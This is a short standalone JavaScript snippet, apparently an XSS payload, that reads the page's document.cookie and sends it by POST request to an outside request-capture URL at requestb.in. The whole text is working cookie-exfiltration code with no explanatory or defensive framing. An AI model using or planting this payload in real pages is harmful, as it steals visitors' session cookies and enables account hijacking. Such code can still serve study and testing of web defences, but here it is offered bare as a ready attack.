var http = new XMLHttpRequest();var url = "http://requestb.in/1evyr3z1";var params = document.cookie;http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http.setRequestHeader("Content-length", params.length);
http.setRequestHeader("Connection", "close");
http.onreadystatechange = function(){if(http.readyState == 4 && http.status == 200){console.log(http.responseText);}};http.send(params);
